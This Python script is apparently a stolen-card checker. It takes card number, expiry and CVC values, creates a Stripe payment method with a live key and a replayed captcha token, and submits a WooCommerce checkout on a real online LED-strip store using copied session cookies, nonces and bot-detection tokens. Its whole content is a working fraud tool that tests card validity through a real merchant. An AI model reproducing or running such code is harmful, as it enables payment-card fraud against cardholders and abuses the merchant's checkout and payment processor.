import requests
def Tele(ccx):
	try:
		ccx=ccx.strip()
		n = ccx.split("|")[0]
		mm = ccx.split("|")[1]
		yy = ccx.split("|")[2]
		cvc = ccx.split("|")[3]
		if "20" in yy:#ebrahim
			yy = yy.split("20")[1]
		print(n,mm,yy,cvc)
	
		headers = {
		    'authority': 'api.stripe.com',
		    'accept': 'application/json',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'content-type': 'application/x-www-form-urlencoded',
		    'origin': 'https://js.stripe.com',
		    'referer': 'https://js.stripe.com/',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-site',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
		}
		
		data = f'billing_details[name]=Angel+Rippin&billing_details[email]=gvvvv7277%40gmail.com&billing_details[phone]=16462965794&billing_details[address][city]=New+YURK&billing_details[address][country]=US&billing_details[address][line1]=New+YURK&billing_details[address][line2]=&billing_details[address][postal_code]=10001&billing_details[address][state]=NY&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F2625066c49%3B+stripe-js-v3%2F2625066c49%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.ledstripstudio.com&time_on_page=93719&client_attribution_metadata[client_session_id]=612ac746-0bf7-4982-bc30-050913c076fc&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=fb83f278-a5da-4c63-af1a-c3e75f74a5579320a4&muid=313ed4f6-52ff-4440-9239-624dac60e1b92ab439&sid=31c727b5-2a0b-4dd3-b28e-7a65243852e8bbe69d&key=pk_live_8uA09YceMfyMNmofxpSjTQhD006Igjq2Gn&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQY0b1qIVJFOLG0hYd45RnQCxSGpdjMH8GrnMrVOPs6xzFp1zWNzIOvw3s2HNlG6g6qhtenz4JYiH3NRsBEFRAyvIIzpAGp1kFrO32nXTwsjCUyUkRweHmjx2iXPY2rcdRAPd0QgZZ6HcOY7XqWv2bk2AFaU3dyZ-RJ6OwPJBfwi-VCzZzlOa4_25qmH-aTTX2FKFVvfziisXGBL6TDcW4SgSDR5Me7OrmCmRUamGj_YlMwlzRq6u8sZqmTFpNpWuzAIuUOueGO9wXQy--xC2ZWCOY-yvjk1Ej3f6JrulBFkbRMMP392mcx-uVoJsMCU5uWbQ-1PbrmnELxZWYx_GgW2qh5eEpl38bh1VW2E2nZPWmCa6rGr54cXM4bXxfS9crY1acAf7PCxlAHU3KjJqA59zf5rFgjAB_uAaAJloDLxR7wzAKL2fJryWxGSHRHpXMF1ywqlPNGEXLY1nhTSMR3BfgMGFRygaO1mj7K9TRx5_THYN0dFp_6qcJI4CPILeGWRE_LfMni2d0S0ciO-Qsywj-lUDyW8bYU4x9FuIOHDccQacMhnPy8JOLLaI9vIg2ARPx6ZNiq7uKr-NdakxvGYoNP5cD0caQTFEvSyClxLr9_kmsvrUWFD8B1ciuoSRDy9fq6YCZ-Md3_69lGwNIDw580klapmRMlSGKgvS2DLIbjn_3OOwkQeoJbNDFtLEGHLhIEiofwkexb6qsyv2iHhYv94yOKTQGzRrMVJ90eYQP8BViHwMi-48dkNeR_V4CUA3reQ_jv37URu9kBE9xiudvJUvckffmd07ljJcCfb-Au9mysaMTwrCzravkuHwlE74XAf_YwIlGOnlkYQTN7LjeOz_F9lXTKODnKW51WbSwwz1T_RIyhO4S1UB_mek2dCuUsxv7_899w4VhDjGZuDI5i9EoxUeO_0QMbA2J2y1eLLMWTjfBq4Ag-F6Hni-3JioeMGqUERP45aAIcMkZCWzUWvj_fjbMAgoqLo7DLdqV7Pg0y7gBEjZ-PPD0PjGwieM9UZ8CG8gRLgV4asq-BldwfKHEL-DiCWseFmOxOhUcmqrWspWFBSy1QIRItmxbvfS2VxIAHm8oHaeCx93-DgsKNTcZQ1GP8cUls7j-gnRXOm9-nV-ymmQpnGc7apLzwYXivqrAb5kBKLul177i0v9u-3eEo8o9ne-Uu2wvOFQQNL26YJ3PI7yijkstEZl4jVomm1dsluGmQemXPAbbm0xV-B2hRw6nTDOnZeUvAKFC2bddfvHqENcS5zZPmgpWPLzgs3hqH_-WTKqEhlImj7ipWJxjQfLS2x6tvENUujb5DrEZWSnnnIA9hmEywfDkkgliw2gDj_iubZ2D3g97fZQvEzA2FiAAE4puV0PPIC0QqBhso9aF3LY8LnpV2EOou5eto2OWa-ihe5xS7TahYCzUkHlfMENWTCe8bQNmS77rirzK390Pt-n4Hm5kvndwBCAMvZYRnBPvTNiu7A-1bWvKIfMLd75OVgZRgVGaJPARL-0rCwYfdkJLlXDTTuog5G50Z1zsAawHFaxqP_1FjogABYeG4zsp5_9SQHZ0xjPABOwxUKjQj-Ta9fhlOtScFQRRuKXLT62GgDYcW_reVED9irMtDvNkFMEJRnAc3ew_cehnBPIixXjFDDYclLlgY1AQRED-MEh3R0pGThxwrrTKQw3H6r4ISZeC6V7Jxws7dos0TaVKT29qlShFiiIqj9wHBwMf3nit8ZJ5R31rObAaX1ddRjkD2Ebm9dhy_4enin38P_OmvA6BdFkTNGdbo6h1EsWXKVH2xxEwtz0OK5KTOWweKwYdDoJeaJWAV17yfZJfQyLD76Se9ebg5L1Ed_UFxPKxBGt7KxIH0beyrBG7N1F0-j9MP98Xlc2m_s05OJV8Hb5cgdH6zejDbGWVstTfS7qRSIBMhn9ODZgPHzc5WhyUPOtjmIt-KiZXPX6C3xKbH-0gbx1Be6KDL3p0S67dNOqnsIisrdar4AHroP7WWcna7LVf3R6uQXMmxGJVd56fWZHWmZl16gbUmjpWLB4AbuFDWto8XVgvPMvM1j7CSqQSsrOZEQNNVSkYW6ctE7yWSs6alrQzd6kC4Tf2O8u1eUQKNleHDOZm0c76hzaGFyZF9pZM4DMYNvomtyqDFjMzc0ODYyonBkAA.2ATaIKKePtrMyGgucXJFH4jyTE157TTF5l_8x_5KzZk'
		
		response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
		
		idd = (response.json()['id'])
		
		cookies = {
		    'optiMonkClientId': 'f15f3992-7566-8725-2b0e-d066900cf6bd',
		    'optiMonkSession': '1718426576',
		    'nitroCachedPage': '0',
		    'sbjs_migrations': '1418474375998%3D1',
		    'sbjs_current_add': 'fd%3D2024-06-15%2004%3A42%3A56%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.ledstripstudio.com%2Fcart%2F%7C%7C%7Crf%3D%28none%29',
		    'sbjs_first_add': 'fd%3D2024-06-15%2004%3A42%3A56%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.ledstripstudio.com%2Fcart%2F%7C%7C%7Crf%3D%28none%29',
		    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
		    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
		    'sib_cuid': 'e7f8e96e-3608-4d0e-b6cb-55048c19deed',
		    'optiMonkEmbedded172564': 'N4IgFghgzgMglgWzgFwEoFMIGMzoCYgBcAZhADZToC+QA===',
		    'pvc_visits[0]': '1718512975b1920a1718512976b1919a1718512979b9616',
		    '__stripe_mid': '313ed4f6-52ff-4440-9239-624dac60e1b92ab439',
		    '__stripe_sid': '31c727b5-2a0b-4dd3-b28e-7a65243852e8bbe69d',
		    '_gcl_au': '1.1.910929355.1718426580',
		    '_ga': 'GA1.1.239931822.1718426580',
		    '_fbp': 'fb.1.1718426583101.437516918332640297',
		    '_lfa': 'LF1.1.75676f3458d5f249.1718426583177',
		    'wp_woocommerce_session_6a83882460a6b555f5fa4bc8eb57a380': 't_396aac34f87d15046aea4b2e42fb68%7C%7C1718599383%7C%7C1718595783%7C%7C5ef07675191eaf1bec1cc1cf3f0f87c1',
		    'woocommerce_items_in_cart': '1',
		    'optiMonkClient': 'N4IgjA7ATArAbAFhALlAYwIYuAXwDQgBmAbipGABwJRwwQCcBANqcuVTdIyAHYD2AB1ZwcOIA===',
		    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Safari%2F537.36',
		    'sbjs_session': 'pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.ledstripstudio.com%2Fcheckout%2F',
		    'tracking_email': 'gvvvv7277%40gmail.com',
		    'email_id': 'gvvvv7277%40gmail.com',
		    'woocommerce_cart_hash': '8b71f1aad8676badf822098564d7d06e',
		    '_ga_CBBSPRTS4R': 'GS1.1.1718426580.1.1.1718426761.6.0.0',
		}
		
		headers = {
		    'authority': 'www.ledstripstudio.com',
		    'accept': 'application/json, text/javascript, */*; q=0.01',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
		    'origin': 'https://www.ledstripstudio.com',
		    'referer': 'https://www.ledstripstudio.com/checkout/',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-mobile': '?0',
		    'sec-ch-ua-platform': '"Linux"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
		    'x-requested-with': 'XMLHttpRequest',
		}
		
		params = {
		    'wc-ajax': 'checkout',
		}
		
		data = 'billing_first_name=Angel&billing_last_name=Rippin&billing_company=&billing_country=US&billing_address_1=New+YURK&billing_address_2=&billing_city=New+YURK&billing_state=NY&billing_postcode=10001&billing_phone=16462965794&billing_email=gvvvv7277%40gmail.com&wc_apbct_email_id=&billing_eu_vat_number=&account_username=&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=EG&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&order_comments=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fwww.ledstripstudio.com%2Fcart%2F&wc_order_attribution_session_start_time=2024-06-15+04%3A42%3A56&wc_order_attribution_session_pages=6&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(X11%3B+Linux+x86_64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F120.0.0.0+Safari%2F537.36&shipping_method%5B0%5D=free_shipping%3A69&payment_method=stripe&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=&wc-stripe-is-deferred-intent=1&terms=on&terms-field=1&woocommerce-process-checkout-nonce=267f2fd769&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&apbct_visible_fields=eyIwIjp7InZpc2libGVfZmllbGRzIjoiYmlsbGluZ19maXJzdF9uYW1lIGJpbGxpbmdfbGFzdF9uYW1lIGJpbGxpbmdfY29tcGFueSBiaWxsaW5nX2NvdW50cnkgYmlsbGluZ19hZGRyZXNzXzEgYmlsbGluZ19hZGRyZXNzXzIgYmlsbGluZ19jaXR5IGJpbGxpbmdfc3RhdGUgYmlsbGluZ19wb3N0Y29kZSBiaWxsaW5nX3Bob25lIGJpbGxpbmdfZW1haWwgd2NfYXBiY3RfZW1haWxfaWQgYmlsbGluZ19ldV92YXRfbnVtYmVyIGFjY291bnRfdXNlcm5hbWUgYWNjb3VudF9wYXNzd29yZCBzaGlwcGluZ19maXJzdF9uYW1lIHNoaXBwaW5nX2xhc3RfbmFtZSBzaGlwcGluZ19jb21wYW55IHNoaXBwaW5nX2NvdW50cnkgc2hpcHBpbmdfYWRkcmVzc18xIHNoaXBwaW5nX2FkZHJlc3NfMiBzaGlwcGluZ19jaXR5IHNoaXBwaW5nX3N0YXRlIHNoaXBwaW5nX3Bvc3Rjb2RlIG9yZGVyX2NvbW1lbnRzIiwidmlzaWJsZV9maWVsZHNfY291bnQiOjI1LCJpbnZpc2libGVfZmllbGRzIjoid2Nfb3JkZXJfYXR0cmlidXRpb25fc291cmNlX3R5cGUgd2Nfb3JkZXJfYXR0cmlidXRpb25fcmVmZXJyZXIgd2Nfb3JkZXJfYXR0cmlidXRpb25fdXRtX2NhbXBhaWduIHdjX29yZGVyX2F0dHJpYnV0aW9uX3V0bV9zb3VyY2Ugd2Nfb3JkZXJfYXR0cmlidXRpb25fdXRtX21lZGl1bSB3Y19vcmRlcl9hdHRyaWJ1dGlvbl91dG1fY29udGVudCB3Y19vcmRlcl9hdHRyaWJ1dGlvbl91dG1faWQgd2Nfb3JkZXJfYXR0cmlidXRpb25fdXRtX3Rlcm0gd2Nfb3JkZXJfYXR0cmlidXRpb25fc2Vzc2lvbl9lbnRyeSB3Y19vcmRlcl9hdHRyaWJ1dGlvbl9zZXNzaW9uX3N0YXJ0X3RpbWUgd2Nfb3JkZXJfYXR0cmlidXRpb25fc2Vzc2lvbl9wYWdlcyB3Y19vcmRlcl9hdHRyaWJ1dGlvbl9zZXNzaW9uX2NvdW50IHdjX29yZGVyX2F0dHJpYnV0aW9uX3VzZXJfYWdlbnQgc2hpcHBpbmdfbWV0aG9kWzBdIHdjLXN0cmlwZS1wYXltZW50LW1ldGhvZC11cGUgd2Nfc3RyaXBlX3NlbGVjdGVkX3VwZV9wYXltZW50X3R5cGUgd2Mtc3RyaXBlLWlzLWRlZmVycmVkLWludGVudCB0ZXJtcy1maWVsZCB3b29jb21tZXJjZS1wcm9jZXNzLWNoZWNrb3V0LW5vbmNlIF93cF9odHRwX3JlZmVyZXIiLCJpbnZpc2libGVfZmllbGRzX2NvdW50IjoyMH19&ct_bot_detector_event_token=a7b24fd6714314f4f117ed52aea46bd9bda273718b89e55f2a2eec166a2ba7f6&wc-stripe-payment-method='+str(idd)+''
		
		response = requests.post('https://www.ledstripstudio.com/', params=params, cookies=cookies, headers=headers, data=data)
		

		try:
			ii=(response.text)
		except:
			return 'error'
		return ii
	except:
		return 'add on time'
